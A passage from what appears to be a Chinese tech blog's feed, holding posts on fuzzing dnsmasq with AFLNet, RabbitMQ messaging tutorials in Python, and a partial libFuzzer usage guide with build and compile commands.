Run Dnsmasq and don&#39;t daemonize (the dnsmasq.conf file will specify port 5353)./dnsmasq</code></pre><p>然后我们dig一下目标</p><pre><code>dig @127.0.0.1 -p 5353 test.com; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.12-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.1 -p 5353 test.com; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40722;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;test.com.            IN    A;; ANSWER SECTION:test.com.        0    IN    A    5.5.5.5;; Query time: 0 msec;; SERVER: 127.0.0.1#5353(127.0.0.1);; WHEN: Tue May 19 14:19:38 EDT 2020;; MSG SIZE  rcvd: 42</code></pre><p>可以开始进行fuzz了</p><pre><code class="shell">cd $WORKDIR/dnsmasq/srcafl-fuzz -d -i $AFLNET/tutorials/dnsmasq/in-dns -o out-dns -N tcp://127.0.0.1/5353 -P DNS -D 10000 -K -R ./dnsmasq</code></pre><p>运行一段时间后就会有crash了</p><p><img src="https://i.loli.net/2020/09/29/uEFhGyWXidzct9C.png" alt="image-20200929152459965"></p><p>当有crash之后我们如何重现漏洞现场，aflnet之中自带了重现工具aflnet-replay，具体用法类似于</p><pre><code class="shell">aflnet-replay packet_file protocol port [first_resp_timeout(us) [follow-up_resp_timeout(ms)]]</code></pre><p>我们可以先gdb 一下dnsmasq然后使用aflnet-replay发送poc</p><p><img src="https://i.loli.net/2020/10/05/EI3oTXiGKw7QnpR.png" alt="image-20201005173801528"></p><p>可以看到目标服务崩溃了，位置断在forward.c:1895上</p><p>相同思路可以应用到其余的网络协议服务之上，比如bind9的named应用程序，但是发现可能会存在crash误报的情况，按理来说aflnet通过识别发送回的状态码进行服务器状态判别应该误差不会太大，还要再读一读论文了解一下原理。</p><p><img src="https://i.loli.net/2020/10/05/ojEiPm2t537HAJ6.png" alt="image-20201005092715081"></p><p>aflnet还有很多功能可以进行探索，比如作者在推特上提到的ipsm.dot，可以时时看到fuzz的进程进度。</p><p><img src="https://i.loli.net/2020/10/05/qRyhgEftc7wJLzr.png" alt="image-20201005175339428"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 论文阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rabbitMQ教程记录</title>
      <link href="2020/08/28/rabittmq/"/>
      <url>2020/08/28/rabittmq/</url>
      
        <content type="html"><![CDATA[<p>简单来说，rabbitMQ主要解决的就是三个问题：</p><p><strong><em>解耦/异步/削峰</em></strong></p><p>当然这也是所有消息中间件的特点</p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acrp6h6j30y90u0q7m.jpg" alt="img"></p><p>下载：</p><p>windows </p><p><a href="https://blog.csdn.net/zhm3023/article/details/82217222">https://blog.csdn.net/zhm3023/article/details/82217222</a></p><p>教程参考官方文档：rabbitMQ tutorials</p><p>网址 <a href="https://www.rabbitmq.com/tutorials">https://www.rabbitmq.com/tutorials</a></p><p>常见名词解释：</p><ul><li><strong>Broker</strong>：简单来说就是消息队列服务器实体。</li><li><strong>Exchange</strong>：消息交换机，它指定消息按什么规则，路由到哪个队列。</li><li><strong>Queue</strong>：消息队列载体，每个消息都会被投入到一个或多个队列。</li><li><strong>Binding</strong>：绑定，它的作用就是把exchange和queue按照路由规则绑定起来。</li><li><strong>Routing Key</strong>：路由关键字，exchange根据这个关键字进行消息投递。</li><li><strong>vhost</strong>：虚拟主机，一个broker里可以开设多个vhost，用作不同用户的权限分离。</li><li><strong>producer</strong>：消息生产者，就是投递消息的程序。</li><li><strong>consumer</strong>：消息消费者，就是接受消息的程序。</li><li><strong>channel</strong>：消息通道，在客户端的每个连接里，可建立多个channel，每个channel代表一个会话任务。</li><li></li></ul><h3 id="教程1：简单一对一"><a href="#教程1：简单一对一" class="headerlink" title="教程1：简单一对一"></a>教程1：简单一对一</h3><p>生产者与消费者通过队列（queue）进行信息的传输</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad02mhfj30le06maa8.jpg" alt="image-20200814175736145"></p><p>生产者</p><pre><code class="python">#!/usr/bin/env pythonimport pikaconnection = pika.BlockingConnection(pika.ConnectionParameters(&#39;localhost&#39;))channel = connection.channel()channel.queue_declare(queue=&#39;hello&#39;)channel.basic_publish(exchange=&#39;&#39;,                      routing_key=&#39;hello&#39;,                      body=&#39;Hello World!&#39;)print(&quot; [x] Sent &#39;Hello World!&#39;&quot;)connection.close()</code></pre><p>消费者</p><pre><code class="python">#!/usr/bin/env pythonimport pikaconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.queue_declare(queue=&#39;hello&#39;)def callback(ch, method, properties, body):    print(&quot; [x] Received %r&quot; % body)channel.basic_consume(    queue=&#39;hello&#39;, on_message_callback=callback, auto_ack=True)print(&#39; [*] Waiting for messages. To exit press CTRL+C&#39;)channel.start_consuming()</code></pre><h3 id="教程2：work工作队列"><a href="#教程2：work工作队列" class="headerlink" title="教程2：work工作队列"></a>教程2：work工作队列</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad0pkmhj30kt084jru.jpg" alt="image-20200815111838307"></p><p>把任务均匀分给别人，按照worker的数量完全平均分配</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6ad13qmaj31fh059wek.jpg" alt="image-20200815111954847"></p><p>这时会有一个问题，如果分配任务的对象死了，那传递的消息就也消失了无法找回。</p><p>我们把<code>auto_ack=True</code>的选项删除，在加上<code>ch.basic_ack（delivery_tag = method.delivery_tag）</code>开始手动消息确认，这样如果任务死了，会紧接着传递给下一个人</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6actz3a2j31fl03774c.jpg" alt="image-20200815112613770"></p><p>但是RabbitMQ退出或崩溃时，它将忘记队列和消息，为了确保该队列将在RabbitMQ节点重启后继续存在，需要将其声明为<em>持久</em></p><pre><code class="python">channel.queue_declare(queue=&#39;hello&#39;, durable=True)</code></pre><p>为了更公平的派遣，而非仅仅是从数量上的一个一个平均分配，更要考虑被分配任务的机器是否正在工作/有空闲的时间</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acsrs7gj30pq074aap.jpg" alt="image-20200815113412715"></p><p>为了解决这个问题，我们可以将Channel＃basic_qos通道方法与 prefetch_count = 1设置一起使用。这使用basic.qos协议方法来告诉RabbitMQ一次不向工作人员提供多个消息。换句话说，在处理并确认上一条消息之前，不要将新消息发送给工作人员。而是将其分派给尚不繁忙的下一个工作人员。</p><pre><code class="python">channel.basic_qos(prefetch_count=1)</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6actj87lj318y051jre.jpg" alt="image-20200815113321909"></p><p>new_task.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaimport sysconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.queue_declare(queue=&#39;task_queue&#39;, durable=True)message = &#39; &#39;.join(sys.argv[1:]) or &quot;Hello World!&quot;channel.basic_publish(    exchange=&#39;&#39;,    routing_key=&#39;task_queue&#39;,    body=message,    properties=pika.BasicProperties(        delivery_mode=2,  # make message persistent    ))print(&quot; [x] Sent %r&quot; % message)connection.close()</code></pre><p>worker.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaimport timeconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.queue_declare(queue=&#39;task_queue&#39;, durable=True)print(&#39; [*] Waiting for messages. To exit press CTRL+C&#39;)def callback(ch, method, properties, body):    print(&quot; [x] Received %r&quot; % body)    time.sleep(body.count(b&#39;.&#39;))    print(&quot; [x] Done&quot;)    ch.basic_ack(delivery_tag=method.delivery_tag)channel.basic_qos(prefetch_count=1)channel.basic_consume(queue=&#39;task_queue&#39;, on_message_callback=callback)channel.start_consuming()</code></pre><h3 id="教程3：发布与订阅"><a href="#教程3：发布与订阅" class="headerlink" title="教程3：发布与订阅"></a>教程3：发布与订阅</h3><p>RabbitMQ消息传递模型的核心思想是生产者从不将任何消息直接发送到队列。实际上，生产者经常甚至根本不知道是否将消息传递到任何队列。</p><p>相反，生产者只能将消息发送到<em>交换机</em>。交流是一件非常简单的事情。一方面，它接收来自生产者的消息，另一方面，将它们推入队列，<em>交换机</em>必须确切知道如何处理收到的消息。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acz6tcfj30n007z0t0.jpg" alt="image-20200815114302592"></p><p>有几种交换类型可用：direct，topic，headers 和fanout，这里主要讨论fanout扇区，我们创建一个exchange称之为log</p><pre><code class="python">channel.exchange_declare(exchange=&#39;logs&#39;,                         exchange_type=&#39;fanout&#39;)</code></pre><p>扇出交换指的是将接收到的所有消息广播到它知道的所有队列中</p><p>无论何时连接到Rabbit，我们都需要一个全新的空队列。为此，我们可以创建一个具有随机名称的队列，或者甚至更好-让服务器为我们选择一个随机队列名称。我们可以通过为queue_declare提供空的queue参数来做到这一点</p><pre><code class="python">result = channel.queue_declare(queue=&#39;&#39;)</code></pre><p><code>result.method.queue</code>包含一个随机队列名称，它可能看起来像<code>amq.gen-JzTY20BRgKO-HjmUJj0wLg</code></p><p>其次，一旦使用方连接关闭，则应删除队列。有一个<code>exclusive</code>标志：</p><pre><code class="python">result = channel.queue_declare(queue=&#39;&#39;, exclusive=True)</code></pre><p>我们已经创建了一个扇出交换和一个队列，现在我们需要告诉交换机将消息发送到我们的队列，交换和队列之间的关系称为<em>绑定 binding</em>。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6aczl8dvj30lh07wmxh.jpg" alt="image-20200815120339203"></p><pre><code class="python">channel.queue_bind(exchange=&#39;logs&#39;,                   queue=result.method.queue)</code></pre><p><img src="https://i.loli.net/2020/08/15/oQXLHDpbWGESK1q.png" alt="image-20200815135453038"></p><p>exchange里的log</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acugqsdj30z406fmxb.jpg" alt="image-20200815135559756"></p><p>两个绑定binding的queue队列</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acux6uyj317o0dkmy7.jpg" alt="image-20200815135709463"></p><p>在发送消息结束之后，两个队列会自动取消</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acy7ccmj31a00gmjs3.jpg" alt="image-20200815135917845"></p><p>receive_logs.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.exchange_declare(exchange=&#39;logs&#39;, exchange_type=&#39;fanout&#39;)result = channel.queue_declare(queue=&#39;&#39;, exclusive=True)queue_name = result.method.queuechannel.queue_bind(exchange=&#39;logs&#39;, queue=queue_name)print(&#39; [*] Waiting for logs. To exit press CTRL+C&#39;)def callback(ch, method, properties, body):    print(&quot; [x] %r&quot; % body)channel.basic_consume(    queue=queue_name, on_message_callback=callback, auto_ack=True)channel.start_consuming()</code></pre><p>emit_log.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaimport sysconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.exchange_declare(exchange=&#39;logs&#39;, exchange_type=&#39;fanout&#39;)message = &#39; &#39;.join(sys.argv[1:]) or &quot;info: Hello World!&quot;channel.basic_publish(exchange=&#39;logs&#39;, routing_key=&#39;&#39;, body=message)print(&quot; [x] Sent %r&quot; % message)connection.close()</code></pre><h3 id="教程4：更加复杂的订阅系统"><a href="#教程4：更加复杂的订阅系统" class="headerlink" title="教程4：更加复杂的订阅系统"></a>教程4：更加复杂的订阅系统</h3><p>在教程三的基础上增加功能，使仅订阅消息的子集成为可能</p><p>Direct exchange直接交换</p><p>上一教程中的日志系统将所有消息广播给所有使用者，想要扩展它以允许根据邮件的严重性过滤邮件。例如，我们可能希望将日志消息写入磁盘的脚本仅接收严重错误，而不会在警告或信息日志消息上浪费磁盘空间。</p><p>我们使用的是<code>fanout</code>，它并没有给我们太大的灵活性-它只能进行无意识的广播。</p><p>我们将使用<code>direct</code>交换。<code>direct</code>交换背后的路由算法很简单-消息进入其绑定密钥与消息的路由密钥完全匹配的队列 。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acveo5uj30sq09yab0.jpg" alt="image-20200815141748835"></p><p>在此设置中，我们可以看到绑定了两个队列的<code>direct</code>交换<code>X</code>。第一个队列由绑定键<code>orange</code>绑定，第二个队列有两个绑定，一个绑定键为<code>black</code>，另一个绑定为<code>green</code>。在这样的设置中，将使用路由键<code>orange</code>将要发布到交换机的消息路由到队列Q1。路由键为<code>black</code>或<code>green</code>的消息将转到Q2。所有其他消息将被丢弃。</p><p>Multiple bindings多重绑定</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acxadhmj30oj096q3q.jpg" alt="image-20200815142309335"></p><p>用相同的绑定密钥绑定多个队列是完全可行的。如上图，我们可以使用绑定键<code>black</code>在<code>X</code>和<code>Q1.Q2</code>之间添加绑定。在这种情况下，直接交换的行为类似于<code>sanout</code>，并将消息广播到所有匹配的队列。带有<code>black</code>路由键的消息将同时传递给 <code>Q1</code>和<code>Q2</code>。</p><p>将以上的运用在我们的信息系统之中</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acxq03uj30qv0badgz.jpg" alt="image-20200815144536340"></p><p>emit_log_direct.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaimport sysconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.exchange_declare(exchange=&#39;direct_logs&#39;, exchange_type=&#39;direct&#39;)severity = sys.argv[1] if len(sys.argv) &gt; 1 else &#39;info&#39;message = &#39; &#39;.join(sys.argv[2:]) or &#39;Hello World!&#39;channel.basic_publish(    exchange=&#39;direct_logs&#39;, routing_key=severity, body=message)print(&quot; [x] Sent %r:%r&quot; % (severity, message))connection.close()</code></pre><p>receive_logs_direct.py</p><pre><code class="python">#!/usr/bin/env pythonimport pikaimport sysconnection = pika.BlockingConnection(    pika.ConnectionParameters(host=&#39;localhost&#39;))channel = connection.channel()channel.exchange_declare(exchange=&#39;direct_logs&#39;, exchange_type=&#39;direct&#39;)result = channel.queue_declare(queue=&#39;&#39;, exclusive=True)queue_name = result.method.queueseverities = sys.argv[1:]if not severities:    sys.stderr.write(&quot;Usage: %s [info] [warning] [error]\n&quot; % sys.argv[0])    sys.exit(1)for severity in severities:    channel.queue_bind(        exchange=&#39;direct_logs&#39;, queue=queue_name, routing_key=severity)print(&#39; [*] Waiting for logs. To exit press CTRL+C&#39;)def callback(ch, method, properties, body):    print(&quot; [x] %r:%r&quot; % (method.routing_key, body))channel.basic_consume(    queue=queue_name, on_message_callback=callback, auto_ack=True)channel.start_consuming()</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acyoj8pj31fp07ewfg.jpg" alt="image-20200815145732667"></p><h3 id="教程5-更复杂的topic交换"><a href="#教程5-更复杂的topic交换" class="headerlink" title="教程5 更复杂的topic交换"></a>教程5 更复杂的topic交换</h3><p><code>direct</code>虽然相比<code>sanout</code>有了更加好的功能性，但仍有局限性，无法基于多个条件进行路由。</p><p>例如我们可能只想听听来自’cron’的严重错误，也可以听听’kern’的所有日志，为了实现类似的功能我们就需要<code>topic</code></p><p>topic exchange</p><p>使用topic的exchange不能具有任意的<code>routing_key</code>，它必须是单词列表，以点分隔。这些词可以是任何东西，但通常它们指定与消息相关的某些功能。比如：“ stock.usd.nyse ”，“ nyse.vmw ”，“ quick.orange.rabbit ”。路由关键字中可以包含任意多个单词，最多255个字节。</p><p>topic的逻辑和direct很像，使用特定路由密钥发送的消息将被传递到所有与匹配的绑定密钥绑定的队列。但是，绑定键有两个重要的特殊情况：</p><ul><li>*（star）可以代替一个单词。</li><li>＃（hash）可以替代零个或多个单词。</li></ul><p>我们可以使用以下示例进行理解：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gi6acwsw56j30ra08wmy4.jpg" alt="image-20200818145608244"></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libFuzzer使用总结教程</title>
      <link href="2020/06/03/libfuzzer/"/>
      <url>2020/06/03/libfuzzer/</url>
      
        <content type="html"><![CDATA[<p>本篇文章简述libFuzzer原理，配合各个实例介绍参数功能意义，为最终进一步的完全利用奠定基础</p><a id="more"></a><h2 id="理论篇"><a href="#理论篇" class="headerlink" title="理论篇"></a>理论篇</h2><h3 id="libFuzzer是什么？"><a href="#libFuzzer是什么？" class="headerlink" title="libFuzzer是什么？"></a>libFuzzer是什么？</h3><p>LibFuzzer在概念上与American Fuzzy Lop（<a href="http://lcamtuf.coredump.cx/afl/">AFL</a>）类似，但它是在单个进程中执行了所有模糊测试。进程内的模糊测试可能更具针对性，由于没有进程反复启动的开销，因此与AFL相比可能更快。</p><p>按照官方定义，<strong>libFuzzer</strong> 是一个<code>in-process（进程内的）</code>，<code>coverage-guided（以覆盖率为引导的）</code>，<code>evolutionary（进化的）</code> 的 <code>fuzz</code> 引擎，是 <code>LLVM</code> 项目的一部分。据<a href="https://security.googleblog.com/2016/08/guided-in-process-fuzzing-of-chrome.html">Google官方技术博客</a>的表述，这三个特性可分别解释为如下意义：</p><ul><li><p><code>in-process（进程内的）</code>：<em>we mean that we don’t launch a new process for every test case, and that we mutate inputs directly in memory.</em>  我们并没有为每一个测试用例都开启一个新进程，而是在一个进程内直接将数据投放在内存中。</p></li><li><p><code>coverage-guided（以覆盖率为引导的）</code>：<em>we mean that we measure code coverage for every input, and accumulate test cases that increase overall coverage.</em> 我们对每一个输入都进行代码覆盖率的计算，并且不断积累这些测试用例以使代码覆盖率最大化。</p></li><li><p><code>evolutionary（进化的）</code>：fuzz按照类型分为3类，这是最后一种。</p><blockquote><p>第一类是基于生成的<code>Generation Based</code>通过对目标协议或文件格式建模的方法，从零开始产生测试用例，没有先前的状态；</p><p>第二类为基于突变的<code>Evolutionary</code>基于一些规则，从已有的数据样本或存在的状态变异而来；</p><p>最后一种就是基于进化的<code>Evolutionary</code>包含了上述两种，同时会根据代码覆盖率的回馈进行变异。</p></blockquote></li></ul><p>LibFuzzer和要被测试的库链接在一起，通过一个特殊的模糊测试进入点（目标函数），用测试用例feed（喂）要被测试的库。fuzzer会跟踪哪些代码区域已经测试过，然后在输入数据的语料库上产生变异，来最大化代码覆盖。其中代码覆盖的信息由LLVM的SanitizerCoverage插桩提供。</p><h3 id="libFuzzer与传统Fuzz相比的特点"><a href="#libFuzzer与传统Fuzz相比的特点" class="headerlink" title="libFuzzer与传统Fuzz相比的特点"></a>libFuzzer与传统Fuzz相比的特点</h3><h4 id="传统fuzz面临问题"><a href="#传统fuzz面临问题" class="headerlink" title="传统fuzz面临问题"></a>传统fuzz面临问题</h4><ul><li>搜索空间过于广泛</li><li>无法fuzz特定的函数</li><li>难以fuzz网络协议</li><li>常规fuzz速度太慢</li></ul><p>传统的 <code>fuzz</code> 大多通过对已有的样本 <strong>按照预先设置好的规则</strong> 进行变异产生测试用例，然后喂给 目标程序同时监控目标程序的运行状态，这类 <code>fuzz</code> 有很多，比如: <code>peach</code> , <code>FileFuzz</code> 等。找寻漏洞的过程形如下图：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhps16nolj30fs0aganf.jpg" alt="image-20200605210407383"></p><h4 id="libFuzzer的优势"><a href="#libFuzzer的优势" class="headerlink" title="libFuzzer的优势"></a>libFuzzer的优势</h4><ul><li>In-process, in-memory</li><li>会主动引导fuzz过程</li><li>针对函数/协议级别的fuzz非常有效率</li><li>1000x的快</li><li>编写基于libfuzzer的fuzzer很容易</li><li>可以单独跟随一个单元进行检测</li></ul><p>libFuzzer所有的程序的主要功能都是对一些 <strong>字节序列</strong> 进行操作，基于这一个事实（<code>libfuzzer</code> 生成 随机的 字节序列 ，扔给 待<code>fuzz</code> 的程序，然后检测是否有异常出现） 所以在 <code>libfuzzer</code> 看来，<code>fuzz</code> 的目标 其实就是一个 以 <strong>字节序列</strong> 为输入的 <strong>函数</strong>。其过程形如下图：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhpsxzyddj30g10ay49d.jpg" alt="image-20200605210458829"></p><h3 id="libFuzzer的理论过程"><a href="#libFuzzer的理论过程" class="headerlink" title="libFuzzer的理论过程"></a>libFuzzer的理论过程</h3><p>简单理解 <code>libfuzzer</code> 就是，如果我们要 <code>fuzz</code> 一个程序，找到一个入口函数，然后利用</p><pre><code>extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123;    .......    .......&#125;</code></pre><p>接口（hardness），我们可以拿到 <code>libfuzzer</code> 生成的 <strong>测试数据以及测试数据的长度</strong>，我们的任务就是<strong>把这些生成的测试数据 传入到目标程序中 让程序来处理 测试数据， 同时要尽可能的触发更多的代码逻辑</strong>。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhqqg37osj30ig0a4aar.jpg" alt="image-20200605213711784"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhqr5qln1j30ig09kaar.jpg" alt="image-20200605213753311"></p><p><code>libfuzzer</code> 已经把 一个 <code>fuzzer</code> 的核心（样本生成引擎和异常检测系统） 给做好了， 我们需要做的是根据目标程序的逻辑，把 <code>libfuzzer</code> 生成的数据，交给目标程序处理，然后在编译时采取合适的 <code>Sanitizer</code> 用于检测运行时出现的内存错误。</p><h2 id="实践篇"><a href="#实践篇" class="headerlink" title="实践篇"></a>实践篇</h2><p>实践部分建议学习查阅Google的**<a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md">libFuzzerTutorial</a>**，内容比较完善跟随不同的案例逐个验证libFuzzer的具体功能，但是因为介绍每个功能采用的案例不同，可能对于新手来说割裂感比较严重，我把共用的部分摘取总结出来把这部分变成一个工具书，理想的是在一个具体案例中能够运用一遍所有的常用功能，这样更加连贯，具体实践放在最后的案例篇。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方推荐使用Ubuntu16.04 x64安装，其本身是<code>llvm</code>项目的一部分，和<code>clang</code>是亲兄弟，二者项目源码分别可见于<a href="https://github.com/llvm/llvm-project/tree/master/compiler-rt/lib/fuzzer%E5%92%8Chttps://github.com/llvm/llvm-project/tree/master/clang%EF%BC%8C%E5%B0%B1%E5%9C%A8%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93%E9%87%8C%E9%9D%A2%EF%BC%8C%E7%8E%B0%E5%9C%A8%E7%A8%8D%E5%BE%AE%E6%96%B0%E7%9A%84%E7%89%88%E6%9C%AC%E7%9A%84clang%E9%83%BD%E5%B7%B2%E7%BB%8F%E5%86%85%E7%BD%AElibFuzzer%E4%BA%86%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8llvm%E5%AE%98%E6%96%B9%E6%8F%90%E4%BE%9B%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%82">https://github.com/llvm/llvm-project/tree/master/compiler-rt/lib/fuzzer和https://github.com/llvm/llvm-project/tree/master/clang，就在同一个仓库里面，现在稍微新的版本的clang都已经内置libFuzzer了，也可以使用llvm官方提供的脚本进行安装。</a></p><pre><code class="bash">#!/bin/bash -eux# Copyright 2016 Google Inc.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at##      http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.#################################################################################sudo apt-get updatesudo apt-get upgrade -ysudo apt-get autoremove -ysudo apt-get install -y libc6-dev binutils libgcc-5-devLLVM_DEP_PACKAGES=&quot;build-essential make cmake ninja-build git python2.7&quot;sudo apt-get install -y $LLVM_DEP_PACKAGESWORK_DIR=$PWDmkdir -p $WORK_DIR/src# Checkoutcd $WORK_DIR/src &amp;&amp; git clone --depth 1 http://llvm.org/git/llvm.gitcd $WORK_DIR/src/llvm/tools &amp;&amp; git clone --depth 1 http://llvm.org/git/clang.gitcd $WORK_DIR/src/llvm/projects &amp;&amp; git clone --depth 1 http://llvm.org/git/compiler-rt.gitcd $WORK_DIR/src/llvm/projects &amp;&amp; git clone --depth 1 http://llvm.org/git/libcxx.gitcd $WORK_DIR/src/llvm/projects &amp;&amp; git clone --depth 1 http://llvm.org/git/libcxxabi.git# Uncomment if you want *fresh* libFuzzer from checkouted repository.#rm -r $WORK_DIR/libFuzzer/Fuzzer#cp -r $WORK_DIR/src/llvm/projects/compiler-rt/lib/fuzzer/ $WORK_DIR/libFuzzer/Fuzzer# Build &amp; Installmkdir -p $WORK_DIR/work/llvmcd $WORK_DIR/work/llvm# Consider adding of -DCMAKE_INSTALL_PREFIX=%PATH% flag, if you do not want to# install fresh llvm binaries into standard system paths.cmake -G &quot;Ninja&quot; \      -DLIBCXX_ENABLE_SHARED=OFF -DLIBCXX_ENABLE_STATIC_ABI_LIBRARY=ON \      -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \      $WORK_DIR/src/llvmninja -j$(nproc)sudo ninja installrm -rf $WORK_DIR/work/llvm</code></pre><h3 id="编写Fussing-Target（hardness）"><a href="#编写Fussing-Target（hardness）" class="headerlink" title="编写Fussing Target（hardness）"></a>编写Fussing Target（hardness）</h3><p>libFuzzer要求实现一个<code>fuzz target</code>作为被测对象的接口，这个入口点用来接收 libFuzzer 生成的 测试用例（比特序列）</p><p>官方文档中的代码示例如下：</p><pre><code class="c++">// fuzz_target.ccextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123;  DoSomethingInterestingWithMyAPI(Data, Size);  return 0;  // Non-zero return values are reserved for future use.&#125;</code></pre><p>名称参数返回值类型都不能动，并且注意参数中传来的字节数组<code>Data</code>是通过底层const修饰了的，也就是不允许修改其中数据。</p><ul><li><p><code>data</code> 是 <code>libFuzzer</code> 生成的 测试数据， <code>size</code> 是数据的长度</p></li><li><p><code>fuzz</code> 引擎会在一个进程中进行多次 <code>fuzz</code>， 所以其效率非常高</p></li><li><p>要能处理各种各样的输入 （空数据， 大量的 或者 畸形的数据…)</p></li><li><p>内部不会调用 <code>exit()</code></p></li><li><p>如果使用多线程的话，在函数末尾要把 线程 <code>join</code></p></li></ul><p>fuzzer target（即<code>LLVMFuzzerTestOneInput</code>函数）目的是作为被测对象与libFuzzer库之间的一个中转接口，其作用在于接受libFuzzer提供的输入数据<code>Data</code>字节串，（可能还需要进行数据格式转换，）然后传递给实际的被测函数（如上述示例中的<code>DoSomethingInterestingWithMyAPI</code>）。</p><p>官方文档中对其有如下要求：</p><ul><li><p>The fuzzing engine will execute the fuzz target many times with different inputs in the same process.</p><p>函数会在同一进程中多次执行，即被循环调用。</p></li><li><p>It must tolerate any kind of input (empty, huge, malformed, etc).</p><p>必须接受所有格式的输入。</p></li><li><p>It must not exit() on any input.</p><p>不允许主动退出，前面说了是循环调用，退出了就没法循环了。</p></li><li><p>It may use threads but ideally all threads should be joined at the end of the function.</p><p>可以开线程，但返回之前必须结束它，原因还是那个——循环调用，自己的线程自己关。</p></li><li><p>It must be as deterministic as possible. Non-determinism (e.g. random decisions not based on the input bytes) will make fuzzing inefficient.</p><p>其执行必须结果必须是具有确定性的，两次的Data如果一致，则两次执行的结果也必须一致。</p></li><li><p>It must be fast. Try avoiding cubic or greater complexity, logging, or excessive memory consumption.</p><p>速度，速度！毕竟模糊测试需要进行大量数据的测试。</p></li><li><p>Ideally, it should not modify any global state (although that’s not strict).</p><p>不允许修改全局变量，因为在同一个进程里，修改全局变量会导致下一次运行时读取的是修改后的结果，可能会违反前面说的确定性原则。</p></li><li><p>Usually, the narrower the target the better. E.g. if your target can parse several data formats, split it into several targets, one per format.</p><p>尽量窄范围测试，如果测试处理多种数据格式的目标，还是分割成多个子目标为好。这既是处于速度考量，也是出于模糊测试数据变异的效果考量。</p></li></ul><h3 id="编译连接"><a href="#编译连接" class="headerlink" title="编译连接"></a>编译连接</h3><p>文档中给出的编译链接命令大致可归纳为：</p><pre><code class="bash">clang++ -g -O1 -fsanitize=fuzzer,address -fsanitize-coverage=trace-pc-guard \fuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \-o mytarget_fuzzer</code></pre><ul><li><p><code>-g</code>和<code>-O1</code>是gcc/clang的通用选项，前者保留调试信息，使错误消息更易于阅读；后者指定优化等级为1（保守地少量优化），但这两个选项不是必须的。</p></li><li><p><code>-fsanitize=fuzzer</code>才是关键，通过这个选项启用libFuzzer，向libFuzzer提供进程中的覆盖率信息，并与libFuzzer运行时链接。</p></li><li><p>除了<code>fuzzer</code>外，还可以附加其他sanitize（漂白剂）选项也可以加进来，如<code>-fsanitize=fuzzer,address</code>同时启用了地址检查。关于地址漂白剂详细作用可以查看llvm的官方文档<a href="http://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer</a></p><blockquote><p>常用内存错误检测工具</p><p><code>AddressSanitizer</code>: 检测 